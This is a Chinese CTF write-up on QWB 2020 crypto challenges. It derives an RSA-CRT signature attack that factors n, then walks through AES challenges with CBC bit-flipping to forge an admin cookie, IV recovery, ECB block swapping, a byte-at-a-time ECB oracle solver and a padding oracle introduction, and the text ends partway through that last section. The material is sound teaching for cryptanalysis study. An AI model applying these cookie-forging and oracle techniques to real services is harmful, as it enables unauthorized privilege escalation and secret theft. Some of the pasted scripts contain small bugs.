        <h1 id="baby-crt"><a href="#baby-crt" class="headerlink" title="baby_crt"></a>baby_crt</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes, getStrongPrime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, p, q</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_t</span>(<span class="params">d</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t = getPrime(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> t % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> libnum.gcd(d, t - <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">m, params</span>):</span><br><span class="line">    d, p, q, n, t1, t2, e1, e2 = params</span><br><span class="line">    dp = d % ((p - <span class="number">1</span>) * (t1 - <span class="number">1</span>))</span><br><span class="line">    dq = d % ((q - <span class="number">1</span>) * (t2 - <span class="number">1</span>))</span><br><span class="line">    k = getPrime(<span class="number">16</span>)</span><br><span class="line">    Sp = <span class="built_in">pow</span>(m + k, dp, p * t1)</span><br><span class="line">    Sq = <span class="built_in">pow</span>(m, dq, q * t2)</span><br><span class="line">    Cp = q * t2 * libnum.invmod(q * t2, p * t1)</span><br><span class="line">    Cq = p * t1 * libnum.invmod(p * t1, q * t2)</span><br><span class="line">    S = (Cp * Sp + Cq * Sq) % (n * t1 * t2)</span><br><span class="line">    c1 = (m - <span class="built_in">pow</span>(S, e1, t1) + <span class="number">1</span>) % t1</span><br><span class="line">    c2 = (m - <span class="built_in">pow</span>(S, e2, t2) + <span class="number">1</span>) % t2</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(S, c1 * c2, n)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> p &lt; q</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&quot;flag&#123;&quot;</span> + sha1(long_to_bytes(p)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">t1 = gen_t(d)</span><br><span class="line">et1 = libnum.invmod(d, t1 - <span class="number">1</span>)</span><br><span class="line">t2 = gen_t(d)</span><br><span class="line">et2 = libnum.invmod(d, t2 - <span class="number">1</span>)</span><br><span class="line">params = (d, p, q, n, t1, t2, et1, et2)</span><br><span class="line">m = randint(<span class="number">1</span>, n-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">sig = sign(m, params)</span><br><span class="line"><span class="built_in">print</span>(sig)</span><br></pre></td></tr></table></figure>

<p>先捋一下逻辑，输出了三个参数，n、m、sig，也就是output0中的三个数。</p>
<p>对于n，直接利用<a target="_blank" rel="noopener" href="https://factordb.com/%E5%88%86%E8%A7%A3%EF%BC%8C%E5%8F%AF%E7%9B%B4%E6%8E%A5%E5%BE%97%E5%88%B0p%E3%80%81q">https://factordb.com/分解，可直接得到p、q</a>(p&lt;q)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 149580444233086025790179573414856711556292635219028492250676309233306926698347672114881938858364663009604584293251087505211665595084567645013671843742930965283973691725982783226085450276850737892819830479107029360437303876681309102929919702367620122904659518881851295355796994990602745486313662851309278333637</span><br><span class="line">q = 175947855464630318882274211369050447335314682338022384131546160543733195355501291230119719123032944939427500196558321955068490980548179604648557892933129317527213012520680627573834567002223872890806611275061140244033706361520509332755932759567357620312030849014630507761409535339555754829420991613721802012281</span><br></pre></td></tr></table></figure>

<p>不利用网站，分析一下数学原理：</p>
<p>已知n、e、m、sig，sig由函数sign生成，m∈[1,n-1]是随机整数</p>
<p>已知n，对于d，可知</p>
<p>$$e*d\equiv 1 \mod \phi(n)\ \phi(n)&#x3D;(p-1)(q-1)$$</p>
<p>t&#x3D;t1、t2由函数gen_t(d)生成，对于gen_t(d)，可知，t1、t2是16比特的素数（题目为二进制形式）</p>
<p>$$t ≡ 3 \mod 4\ \gcd(d,t-1)$$</p>
<p>对于et&#x3D;et1、et2，有</p>
<p>$$et*d \equiv 1 \mod (t-1)$$</p>
<p>接下来用d, p, q, n, t1, t2, et1, et2对消息m进行签名，得到sig &#x3D; sign(m, params)。</p>
<p>对于sign(m, params)，可知，k也是16比特的素数</p>
<p>$$\begin{aligned} dp &amp;\equiv d \mod \phi(p<em>t1)\ dq &amp;\equiv d \mod \phi(q</em>t2)\ Sp &amp;\equiv (m+k)^{dp} \mod (p<em>t1)\ Sq &amp;\equiv m^{dq} \mod (q</em>t2)\ Cp &amp;\equiv q<em>t2</em>((q<em>t2)^{-1}\mod (p</em>t1))\ Cq &amp;\equiv p<em>t1</em>((p<em>t1)^{-1}\mod (q</em>t2))\ S &amp;\equiv Cp<em>Sp+Cq</em>Sq \mod (p<em>q</em>t1<em>t2)\ c1 &amp;\equiv m-S^{et1} +1 \mod t1\ c2 &amp;\equiv m-S^{et2} +1 \mod t2\ sig &amp;\equiv S^{c1</em>c2} \mod n\ \end{aligned}$$</p>
<p>对于Sp、Sq、Cp、Cq、S，考虑中国剩余定理：</p>
<p>$$x ≡ \sum_{i&#x3D;1}^{n}(a_i * M&#x2F;m_i * [(M&#x2F;m_i)^{-1}\pmod {m_i}]) \pmod M,\ M&#x3D;\prod_{i&#x3D;1}^n{m_i},\ \begin{cases}    x ≡ a_1 \pmod {m_1} \    x ≡ a_2 \pmod {m_2} \     …\    x ≡ a_n \pmod {m_n}  \end{cases}$$</p>
<p>因此可得</p>
<p>$$S \equiv Sp \mod(p<em>t1)\ S \equiv Sq \mod(q</em>t2)$$</p>
<p>而模运算具备性质</p>
<p>$$若a ≡ b \mod (m*n),\ 则a ≡ b \mod m,a ≡ b \mod n$$</p>
<p>那么可得到</p>
<p>$$\begin{aligned} S &amp;\equiv (m+k)^{dp} \mod p\ S &amp;\equiv (m+k)^{dp} \mod t1\ S &amp;\equiv m^{dq} \mod q\ S &amp;\equiv m^{dq} \mod t2\ dp &amp;\equiv d \mod (p-1)\ dp &amp;\equiv d \mod (t1-1)\ dq &amp;\equiv d \mod (q-1)\ dq &amp;\equiv d \mod (t2-1)\ et1 &amp;\equiv d^{-1} \mod (t1-1)\ et2 &amp;\equiv d^{-1} \mod (t2-1) \end{aligned}$$</p>
<p>那么由</p>
<p>$$\begin{aligned} S &amp;\equiv (m+k)^{dp} \mod t1\ dp &amp;\equiv d \mod (t1-1)\ et1 &amp;\equiv d^{-1} \mod (t1-1)\ \end{aligned}$$</p>
<p>可得</p>
<p>$$\begin{aligned} S^{et1} \mod t1 &amp;\equiv (m+k)^{dp<em>et1} \mod t1 \ &amp;\equiv (m+k)^{d</em>d^{-1} \mod (t1-1)} \mod t1 \ &amp;\equiv m+k \mod t1 \ \end{aligned}$$</p>
<p>同理，由</p>
<p>$$\begin{aligned} S &amp;\equiv m^{dp} \mod t2\ dq &amp;\equiv d \mod (t2-1)\ et2 &amp;\equiv d^{-1} \mod (t2-1) \end{aligned}$$</p>
<p>可得</p>
<p>$$\begin{aligned} S^{et2} \mod t1 &amp;\equiv m^{dq<em>et2} \mod t2 \ &amp;\equiv m^{d</em>d^{-1} \mod (t2-1)} \mod t2 \ &amp;\equiv m \mod t2 \ \end{aligned}$$</p>
<p>因此根据</p>
<p>$$\begin{aligned} S^{et1} \mod t1 &amp;\equiv m+k \mod t1 \ S^{et2} \mod t1 &amp;\equiv m \mod t2 \ \end{aligned}$$</p>
<p>可得</p>
<p>$$\begin{aligned} c1 &amp;\equiv m-S^{et1} +1 \mod t1\ &amp;\equiv m-(m+k+a<em>t1)+1 \mod t1\ &amp;\equiv 1-k \mod t1 \ &amp;&#x3D;1-k+a</em>t1\ c2 &amp;\equiv m-S^{et2} +1 \mod t2\ &amp;\equiv m-(m+b*t2)+1 \mod t2\ &amp;\equiv 1 \mod t2\ \end{aligned}$$</p>
<p>那么取c2&#x3D;1，将S化简为Sq mod q（Sq未知量少），并根据上面的式子可推导</p>
<p>$$\begin{aligned} sig &amp;\equiv S^{c1<em>c2} \mod n\ &amp;\equiv S^{1-k+a</em>t1} \mod n \ &amp;\equiv S_q^{1-k+a<em>t1} \mod q \ &amp;\equiv S_q \mod q\ sig^e &amp;\equiv S_q^e \mod q\ &amp;\equiv m^{dq</em>e} \mod q\ &amp;\equiv m^{1 \mod q-1} \mod q\ &amp;\equiv m^{1+c(q-1)} \mod q\ &amp;\equiv m \mod q\ sig^e &amp;\equiv S_q^{e*(1-k+a<em>t1)} \mod q\ &amp;\equiv m^{1-k+a</em>t1} \mod q \end{aligned}$$</p>
<p>也就是说，可以通过求最大公约数得到q</p>
<p>$$m^{1-k+a<em>t1}-sig^e|q\ \Rightarrow \gcd((m^{1-k+a</em>t1}-sig^e),n)&#x3D;q≠1$$</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">n = <span class="number">26318358382258215770827770763384603359524444566146134039272065206657135513496897321983920652242182112479484135343436206815722605756557098241887233837248519031879444740922789351356138322947108346833956405647578838873425658405513192437479359531790697924285889505666769580176431360506227506064132034621123828090480606055877425480739950809109048177976884825589023444901953529913585288143291544181183810227553891973915960951526154469344587083295640034876874318610991153058462811369615555470571469517472865469502025030548451296909857667669963720366290084062470583318590585472209798523021029182199921435625983186101089395997</span></span><br><span class="line">m = <span class="number">26275493320706026144196966398886196833815170413807705805287763413013100962831703774640332765503838087434904835657988276064660304427802961609185997964665440867416900711128517859267504657627160598700248689738045243142111489179673375819308779535247214660694211698799461044354352200950309392321861021920968200334344131893259850468214901266208090469265809729514249143938043521579678234754670097056281556861805568096657415974805578299196440362791907408888958917063668867208257370099324084840742435785960681801625180611324948953657666742195051492610613830629731633827861546693629268844700581558851830936504144170791124745540</span></span><br><span class="line">sig = <span class="number">20152941369122888414130075002845764046912727471716839854671280255845798928738103824595339885345405419943354215456598381228519131902698373225795339649300359363119754605698321052334731477127433796964107633109608706030111197156701607379086766944096066649323367976786383015106681896479446835419143225832320978530554399851074180762308322092339721839566642144908864530466017614731679525392259796511789624080228587080621454084957169193343724515867468178242402356741884890739873250658960438450287159439457730127074563991513030091456771906853781028159857466498315359846665211412644316716082898396009119848634426989676119219246</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">sig_e_1 = <span class="built_in">pow</span>(sig,e,n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    sig_e_2 = <span class="built_in">pow</span>(m,i,n)</span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd((sig_e_2-sig_e_1),n) !=<span class="number">1</span>:</span><br><span class="line">        q = gmpy2.gcd((sig_e_2-sig_e_1)%n,n)</span><br><span class="line">        p = n // q</span><br><span class="line">        <span class="keyword">assert</span> p * q == n</span><br><span class="line">        <span class="built_in">print</span>(p)</span><br><span class="line">        flag = sha1(long_to_bytes(p)).hexdigest()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h1 id="modestudy"><a href="#modestudy" class="headerlink" title="modestudy"></a>modestudy</h1><blockquote>
<p>AES</p>
<p>1、2 、6 CBC    比特翻转攻击    选择密文攻击、IV预测     padding oracle attack</p>
<p>3 、4、5 ECB    如果有几个相同的明文组，那么密文也将有几个相同的片段   选择明文攻击    加密图片</p>
<p>CTR   nonce重用</p>
</blockquote>
<h2 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 1</span></span><br><span class="line">[+] cookie:session=6b1f33a78c5b9c17;admin=0;checksum=552ebbeb9276a8cd9f741b7d29f8c9e1eb455757207ac420659e7eab56ddee25</span><br><span class="line">[+] checksum=aes128cbc.encrypt(session=6b1f33a78c5b9c17;admin=0)</span><br><span class="line">[+] only admin can see flag</span><br><span class="line">[-] cookie:（待输入）</span><br></pre></td></tr></table></figure>

<p>AES分块，每块都是128bits。</p>
<p>AES-CBC加解密如下：</p>
<p>$$Cᵢ &#x3D; Encrypt(Pᵢ ⊕ Cᵢ₋₁)\ Pᵢ &#x3D; Decrypt(Cᵢ) ⊕ Cᵢ₋₁$$</p>
<style>.jqeqaoiuawmj{zoom:67%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936656-12.png" class="jqeqaoiuawmj" alt="img">

<style>.teordfwqutyr{zoom:67%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936651-1.png" class="teordfwqutyr" alt="img">

<style>.ebnwizgqiheu{zoom:67%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936651-2.png" class="ebnwizgqiheu" alt="img">

<p>伪造一个合适的checksum，使得解密后admin&#x3D;1。</p>
<p>对于AES128的CBC解密模式，将密文按照16字节（128bits）分块，每个密文块先进行AES解密，然后再与前一个密文块（或IV）进行异或操作，得到明文块。</p>
<p>也就是可以通过伪造“0”（0x30）对应的密文块，从而使得解密后的明文块中的“0”变为“1”（0x31）。</p>
<p>$$P_1(i) &#x3D; Decrypt(C_1(i)) \oplus C_0(i)\ 需要将C_0(i)修改为C_0^<code>(i)=C_0(i) \oplus \Delta\\ 则P_1^</code>(i)&#x3D;Decrypt(C_1(i)) \oplus C_0^<code>(i)=Decrypt(C_1(i)) \oplus C_0(i) \oplus \Delta=P_1(i)\oplus \Delta\\ 则\Delta=P_1(i) \oplus P_1^</code>(i)\ 则C_0^<code>(i)=C_0(i) \oplus \Delta=C_0(i)\oplus P_1(i)\oplus P_1^</code>(i)$$</p>
<p>也就是说，只需计算C_0^&#96;(i)&#x3D;0xe1⊕0x30⊕0x31&#x3D;0xe0即可，也就是不进位模二加。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session=6b1f33a7          552ebbeb9276a8cd9f741b7d29f8c9e1</span><br><span class="line">8c5b9c17;admin=0          eb455757207ac420659e7eab56ddee25</span><br><span class="line">session=6b1f33a78c5b9c17;admin=0;checksum=552ebbeb9276a8cd9f741b7d29f8c9e0eb455757207ac420659e7eab56ddee25</span><br></pre></td></tr></table></figure>

<h2 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 2</span></span><br><span class="line">[+] sha256(iv)=11f595abc9d7b986d24fce986d1f9ddfb0d83f2f978db20b862ea730e570bff0</span><br><span class="line">[+] 1. server&#x27;s job: print aes_cbc_dec(key,iv,your_input_c).encode(&#x27;hex&#x27;)</span><br><span class="line">[+] 2. your job: guess iv</span><br><span class="line">[-] your choice:（待输入）</span><br></pre></td></tr></table></figure>

<p>令输入的密文为c0、c1，输出的明文为m0、m1。</p>
<p>$$dec(c_0)&#x3D;m_0 \oplus IV\ dec(c_1)&#x3D;m_1 \oplus c_0\ 若c_0&#x3D;c_1,则m_0 \oplus IV&#x3D;m_1 \oplus c_0,\ 则IV&#x3D;m_0 \oplus m_1 \oplus c_0$$</p>
<p>那么输入两次相同的16字节字符串，将这个字符串异或两次解密出的明文，即为IV。</p>
<h2 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 3</span></span><br><span class="line">[+] cookie=session:0884ce7c;timedl=1;admin=0;guess_cookie_ma=1;guess_mp_ab=1;guess_cookie_mb=0;hell_pad=233</span><br><span class="line">[+] 128bit_ecb_encrypt(cookie):0632b3e7adb2f6d5ae4a92f553f2f4a4c9f95b099cfd8e3408137d134eb51d147045f278246a831fabdbdccde099b4b694b07e699ffae6a82c6cfbc4454816b1c78e5d1be8b67e235fbbfd2a75e73f32bac806808bc2e102db8f2c159b250415</span><br><span class="line">[+] only admin can see the flag</span><br><span class="line">[-] input your encrypted cookie(encode hex):（待输入）</span><br></pre></td></tr></table></figure>

<style>.wlstnrjjydry{zoom:67%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936651-3.png" class="wlstnrjjydry" alt="img">

<p>先将明密文分块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session:0884ce7c          0632b3e7adb2f6d5ae4a92f553f2f4a4</span><br><span class="line">;timedl=1;admin=          c9f95b099cfd8e3408137d134eb51d14</span><br><span class="line">0;guess_cookie_m          7045f278246a831fabdbdccde099b4b6</span><br><span class="line">a=1;guess_mp_ab=          94b07e699ffae6a82c6cfbc4454816b1</span><br><span class="line">1;guess_cookie_m          c78e5d1be8b67e235fbbfd2a75e73f32</span><br><span class="line">b=0;hell_pad=233          bac806808bc2e102db8f2c159b250415</span><br></pre></td></tr></table></figure>

<p>发现第三行和第五行只有第一个字符不一样，且正好是需要的字符“1”，因此把第五行的密文覆盖掉第三行的密文即可。</p>
<h2 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 4</span></span><br><span class="line">[+] sha256(secret)=d014cbddd2cbb0fa2404c519c166bc85c03ee3445d643f451a5f5d6244e7e34d</span><br><span class="line">[+] assert len(secret)==16</span><br><span class="line">[+] 1. server&#x27;s job: print aes_ecb(key,input+secret+&#x27;\x00&#x27;*((16-(len(input+secret) % 16)) % 16))</span><br><span class="line">[+] 2. your job: guess secret</span><br><span class="line">[-] your choice:（待输入）</span><br></pre></td></tr></table></figure>

<p>由于ECB模式是分块加密，每块16字节，第一次先输入15字节”1“，会自动拼接1字节secret[0]，然后从0x0-0xff爆破这一字节，直至对应的密文块相同。第二次输入14字节”1“+secret[0]，会自动拼接1字节secret[1]，再次爆破。以此类推，直至爆破出全部secret。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;x.x.x.x&quot;</span>, <span class="number">1111</span>)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">    padding = <span class="string">b&#x27;1&#x27;</span> * (<span class="number">16</span>-i)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;input(encode hex):&quot;</span>,padding.<span class="built_in">hex</span>().encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;before encrypted:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.recvline)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;encrypted msg: &quot;</span>)</span><br><span class="line">    cypher = p.recvline.decode().strip()[:<span class="number">32</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;cipher: <span class="subst">&#123;cipher&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        test_padding = padding + secret + <span class="built_in">bytes</span>([j])</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;input(encode hex):&quot;</span>, (test_padding.<span class="built_in">hex</span>().encode()))</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;encrypted msg: &quot;</span>)</span><br><span class="line">        test_cypher = p.recvline.decode().strip()[:<span class="number">32</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;test_cypher: <span class="subst">&#123;test_cypher&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cypher == test_cypher:</span><br><span class="line">            secret += <span class="built_in">bytes</span>([j])</span><br><span class="line">    <span class="built_in">print</span>(secret)</span><br></pre></td></tr></table></figure>

<h2 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 5</span></span><br><span class="line">[+] sha256(secret)=4c766c8749526dd1a14fdf37619d2fbebbbc2478e25e27e63e591ae0aafb305d</span><br><span class="line">[+] assert len(secret)==16</span><br><span class="line">[+] myblockencrypt_ecb(secret).encode(&quot;hex&quot;)=4c21cc2bc7941b224ed45bd02ee11b60</span><br><span class="line">[+] In this challenge, you need to try something.</span><br><span class="line">[+] 1. server&#x27;s job: print myblockencrypt_ecb(your_input)</span><br><span class="line">[+] 2. your job: guess secret</span><br><span class="line">[-] your choice:（待输入）</span><br></pre></td></tr></table></figure>

<p>尝试一些输入，直接拿writeup的例子说明。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] In this challenge, you need to try something.</span><br><span class="line">[+] 1. server&#x27;s job: print myblockencrypt_ecb(your_input)</span><br><span class="line">[+] 2. your job: guess secret</span><br><span class="line">[-] your choice:1</span><br><span class="line">[-] input(encode hex):80808080808080808080808080808080</span><br><span class="line">[+] myblockencrypt_ecb(your_input).encode(&quot;hex&quot;):35093509350935093509350935093509</span><br><span class="line">[+] 1. server&#x27;s job: print myblockencrypt_ecb(your_input)</span><br><span class="line">[+] 2. your job: guess secret</span><br><span class="line">[-] your choice:1</span><br><span class="line">[-] input(encode hex):66666666666666666666666666666666</span><br><span class="line">[+] myblockencrypt_ecb(your_input).encode(&quot;hex&quot;):022c022c022c022c022c022c022c022c</span><br></pre></td></tr></table></figure>

<p>加密实际上就是对每2byte进行置换，也就是分组长度位2byte的加密，实际上就是每16位一段进行加密且互不影响。列一个置换表出来，即可找到secret。数次访问的加密结果完全相同，可以认为这个加密是个固定的映射，因此尝试从0000到ffff的所有输入，然后去对密文就可以了。</p>
<h2 id="challenge6"><a href="#challenge6" class="headerlink" title="challenge6"></a>challenge6</h2><blockquote>
<p>padding oracle attack猜解IV</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 6</span></span><br><span class="line">[+] padding(m):m+chr(16-(len(m)%16))*(16-(len(m)%16))</span><br><span class="line">[+] unpadding(m):m[:-ord(m[-1])]</span><br><span class="line">[+] len(secret):16</span><br><span class="line">[+] iv+aes128_cbc(key,iv,padding(secret)):31313131313131313131313131313131891f3925b171f363bfc1ab0f4c03c9172cdfbd56dbd225d2accaf2b6fcbd0780</span><br><span class="line">[+] 1. server&#x27;s job: decrypt and unpadding</span><br><span class="line">[+] 2. your job: guess secret</span><br><span class="line">[-] your choice:（待输入）</span><br><span class="line"></span><br><span class="line">31313131313131313131313131313131 # IV，即ASCII &#x27;1&#x27;的重复</span><br><span class="line">891f3925b171f363bfc1ab0f4c03c917 # 第一组密文</span><br><span class="line">2cdfbd56dbd225d2accaf2b6fcbd0780 # 第二组密文</span><br></pre></td></tr></table></figure>

<p>首先详细了解CBC模式的加解密过程</p>
<style>.gtoifmdczagx{zoom:67%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936651-4.png" class="gtoifmdczagx" alt="img">

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="number">1</span>. 明文经过填充后，分为不同的组block，以组的方式对数据进行处理 </span><br><span class="line"><span class="number">2</span>. 初始化向量（IV）首先和第一组明文进行XOR（异或）操作，得到”中间值“</span><br><span class="line"><span class="number">3</span>. 采用密钥对中间值进行块加密，删除第一组加密的密文 （加密过程涉及复杂的变换、移位等） </span><br><span class="line"><span class="number">4</span>. 第一组加密的密文作为第二组的初始向量（IV），参与第二组明文的异或操作  </span><br><span class="line"><span class="number">5</span>. 依次执行块加密，最后将每一块的密文拼接成密文  </span><br></pre></td></tr></table></figure>

<style>.wineedkxqikj{zoom:67%;}</style><img src="/2020/11/02/qwb2020-crypto/1763435936652-5.png" class="wineedkxqikj" alt="img">

